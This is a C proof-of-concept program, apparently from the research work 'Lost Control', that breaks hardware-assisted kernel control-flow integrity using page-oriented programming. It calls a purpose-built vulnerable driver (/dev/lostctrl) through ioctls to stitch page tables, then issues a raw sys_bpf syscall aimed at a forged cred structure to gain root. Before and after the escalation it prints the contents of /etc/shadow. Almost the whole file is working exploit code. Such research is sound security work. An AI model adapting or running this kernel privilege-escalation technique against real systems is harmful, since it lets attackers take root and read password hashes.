/*
 *  Lost Control: Breaking Hardware-Assisted Kernel Control-Flow Integrity with
 *                         Page-Oriented Programming
 *
 *                      Copyright (c) 2023 Seunghun Han
 *
 */
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <string.h>
#include <unistd.h>

#define __NR_read 0 
#define __NR_write 1 

#define LC_IOCTL_PREPARE 	0x101
#define LC_IOCTL_POP	 	0x102
#define LC_IOCTL_RECOVER 	0x103

#define RED	"\033[1;31m"
#define GREEN	"\033[1;32m"
#define YELLOW	"\033[1;33m"
#define BLUE	"\033[1;34m"
#define MAGENTA	"\033[1;35m"
#define CYAN	"\033[1;36m"
#define WHITE	"\033[1;37m"
#define ENDC 	"\033[0m"
#define BOLD	"\033[1m"
#define UNDERLINE "\033[4m"
#define BLINK	"\033[5m"

#define FIRE	"\033[1;31m\033[5m\033[1m"
//#define FIRE	"\033[1;31m\033[1m"
//#define TITLE 	"\033[1;32m\033[1m\033[5m"
#define TITLE 	FIRE
//#define SUBTITLE "\033[1;32m\033[1m"
#define SUBTITLE "\033[1;32m"
#define SUCCESS	GREEN
#define FAIL	RED


/**
 *	For syscall
 */
int raw_syscall64()
{
    ssize_t ret;

	// Argument: rdi, rsi, rdx, rcx, r8 ,r9, and stacks
	asm volatile
    (
		// sys_bpf() system call
        "mov $321, %rax\n"

		// sys_bpf()'s first argument is 32-bit sized.
		// So, new cred 0xffff8880003ff000 ==> 0x003ff000
        "mov $0x003ff000, %rdi\n"		// First argument
										
        "mov $0x0, %rsi\n"				// Other arguments
        "mov $0x0, %rdx\n"
        "mov $0x0, %rcx\n"
        "mov $0x0, %r8\n"
        "mov $0x0, %r9\n"
        "syscall"						// Execute the system call
    );
    return ret;
}

/**
 *	For int 0x80
 */
int raw_syscall32()
{
    ssize_t ret;

	// Argument: rbx, rcx, edx, esi, edi, and stacks 
	asm volatile
    (
        "mov $0, %rax\n"
        "mov $0x003ff000, %rbx\n"		// First argument
        "mov $0x00, %rcx\n"
        "mov $0x00, %rdx\n"
        "mov $0x00, %rsi\n"
        "mov $0x00, %rdi\n"
		"int $0x80"						// Execute the system call
    );
    return ret;
}

/**
 *	sysenter
 */
int raw_syscall32_2()
{
    ssize_t ret;

	// Argument: rbx, rcx, edx, esi, edi, and stacks 
	asm volatile
    (
        "mov $0, %rax\n"
        "mov $0x003f0000, %rbx\n"		// First argument
        "mov $0x00, %rcx\n"
        "mov $0x00, %rdx\n"
        "mov $0x00, %rsi\n"
        "mov $0x00, %rdi\n"
		"sysenter"						// Execute the system call
    );
    return ret;
}

/**
 *	Read the /etc/shadow file
 */
int cat_etc_shadow()
{
	char buf[4096];

	int fd = open("/etc/shadow", O_RDONLY);

	if (fd == -1)
	{
		fprintf(stderr, "       ==> Access denied.\n");
		return -1;
	}

	fprintf(stderr, "----------------------------------------------------\n");
	read(fd, buf, sizeof(buf) -1);
	buf[sizeof(buf) - 1] = '\0';
	fprintf(stderr, "%s", buf);
	close(fd);
	fprintf(stderr, "----------------------------------------------------\n");

	return 0;
}

void print_logo(void)
{
	fprintf(stderr, "\n");
	fprintf(stderr, "%s                 (                          		\n", FIRE); 
	fprintf(stderr, "                )  '                          (  	\n"); 
	fprintf(stderr, "               ' ,  .      )                 . '	\n");
	fprintf(stderr, "             (    , ) `   ' )               (. ` )  	\n");
	fprintf(stderr, "           ,  .' ) ( . ) ( ' (             ,  ( , )	\n"); 
	fprintf(stderr, "        %s,-). ` , ( .  (  , )%s ---,%s         ( , ')  .'%s---,\n", FIRE, ENDC, FIRE, ENDC);
	fprintf(stderr, "      ,\"%s( _,) . ), ) _) _ .  ),%s\"|%s        ,')  (, ) '.%s\" |\n", FIRE, ENDC, FIRE, ENDC);
	fprintf(stderr, "     +-----------------------+  |      ,\"%s(_  ) _(,\"%s    |\n", FIRE, ENDC);
	fprintf(stderr, "     |  .-----------------.  |  |     +---------+      |\n");
	fprintf(stderr, "     |  | %sLost Control:%s   |  |  |     | -==----'|      |\n", TITLE, ENDC);
	fprintf(stderr, "     |  | %sBreaking the%s    |  |  |     |         |      |\n", SUBTITLE, ENDC);
	fprintf(stderr, "     |  | %sKernel CFI with%s |  |  |/----|`---=    |      |\n", SUBTITLE, ENDC);
	fprintf(stderr, "     |  | %sPage-Oriented%s   |  |  |   ,/|==== ooo |      ;\n", SUBTITLE, ENDC);
	fprintf(stderr, "     |  | %sProgramming%s     |  |  |  // |         |    ,\"	\n", SUBTITLE, ENDC);
	fprintf(stderr, "     |  `-----------------'  |,\" .;'| |         |  ,\"	\n");
	fprintf(stderr, "     +-----------------------+  ;;  | |         |,\"  	\n");   
	fprintf(stderr, "        /_)______________(_/  //'   | +---------+	\n");
	fprintf(stderr, "   ___________________________/___  `,			\n");
	fprintf(stderr, "  /  oooooooooooooooo  .o.  oooo /,   \\,\"-----------	\n");
	fprintf(stderr, " / ==ooooooooooooooo==.o.  ooo= //   ,`\\--{)B     ,\"	\n");
	fprintf(stderr, " `-----------------------------'    '------------\"	\n");
	fprintf(stderr, "\n");
	fprintf(stderr, "  Lost Control PoC Application, Made by Seunghun Han\n");
	fprintf(stderr, "\n");

	sleep(3);
}

/**
 *	Main
 */
int main(int argc, char** argv)
{
    int fd;
	unsigned long i;
	int fail = 0;

	print_logo();
	fprintf(stderr, "=====================================================\n");
	fprintf(stderr, "Show current privilege and read the /etc/shadow file.\n");
	fprintf(stderr, "=====================================================\n");
	fprintf(stderr, "   [*] Checking privilege.\n");
	fprintf(stderr, "       ==> ");
	system("id");
	sleep(1);

	fprintf(stderr, "\n   [*] Trying to read the /etc/shadow file.\n");
	// Read /etc/shadow
	cat_etc_shadow();
	sleep(1);

	fprintf(stderr, "\n");
	fprintf(stderr, "==========================================\n");
	fprintf(stderr, "Start Page-Oriented Programming (POP).\n");
	fprintf(stderr, "==========================================\n");

	//=========================================================================
	// Open the vulnerable kernel driver.
	//   - For simplicity, all remappings are moved to the kernel driver.
	//   - The remappings could be done by the user-level application.
	//=========================================================================
	fd = open("/dev/lostctrl", O_RDONLY);

	//========================================================================
	//	
	// Page stitching stage.
	//	
	//========================================================================
	fprintf(stderr, "   [*] Stitching page tables.\n");
	// Change CR3 for private page tables and remove global bits from them.
	ioctl(fd, LC_IOCTL_PREPARE, NULL);
	sleep(3);

	// Start the page stitching stage.
	ioctl(fd, LC_IOCTL_POP, NULL);
	fprintf(stderr, "       ==> Complete.\n");

	//========================================================================
	//	
	// Page flushing stage.
	//   - Removing the global bit was already done by LC_IOCTL_PREPARE
	//   - So, just sleep here.
	//	
	//========================================================================
	fprintf(stderr, "\n   [*] Flushing the TLB and exploiting the PoC Driver. Please wait ...\n");
	sleep(60);

	//========================================================================
	//	
	// Exploitation stage.
	//	
	//========================================================================
	raw_syscall64();
	//raw_syscall32();

	// Check UID.
	if (geteuid() != 0)
	{
		fprintf(stderr, "       ==> Attack incomplete and try again!\n");
		fail = 1;
	}

	// Recover page tables with the original data.
	ioctl(fd, LC_IOCTL_RECOVER, NULL);
	close(fd);

	// If POP is failed, no need to execute below.
	if (fail == 1)
	{
		return -1;
	}
	sleep(60);
	
	fprintf(stderr, "       ==> Complete.\n");
	sleep(1);

	fprintf(stderr, "\n");
	fprintf(stderr, "===========================================================\n");
	fprintf(stderr, "Show current privilege and read the /etc/shadow file again!\n");
	fprintf(stderr, "===========================================================\n");
	fprintf(stderr, "   [*] Checking privilege again.\n");
	fprintf(stderr, "       ==> ");
	if (fork() == 0)
	{
		system("id");
		while(1);
	}

	sleep(1);
	fprintf(stderr, "\n   [*] Trying to read the /etc/shadow file again!\n");
	// Read the /etc/shadow file
	cat_etc_shadow();

	while(1);

	return 0;
}
